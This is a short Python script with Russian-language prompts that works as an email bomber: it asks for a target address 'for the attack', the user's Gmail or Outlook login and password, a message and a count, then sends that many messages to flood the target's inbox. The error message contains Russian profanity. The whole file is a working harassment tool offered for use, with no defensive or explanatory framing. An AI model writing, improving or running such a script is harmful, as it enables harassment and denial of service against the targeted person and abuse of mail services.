import smtplib, time
try:
    bomb_email = input("Введите email для атаки > ")
    email = input("Введите gmail с которого будете атаковать > ")
    password = input("Введите пароль от gmail > ")
    message = input("Введите сообщение > ")
    counter = int(input("Сколько хотите сообщений? > "))

    s_ = input('Выбери провайдера (gmail/outlook) > ').lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "outlook":
        mail = smtplib.SMTP('smtp.office365.com',587)

    for x in range(0,counter):
        print("Номер сообщения > ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
except Exception as e:
    print("блять ошибка проверь инпуты сука/настройки гугла")
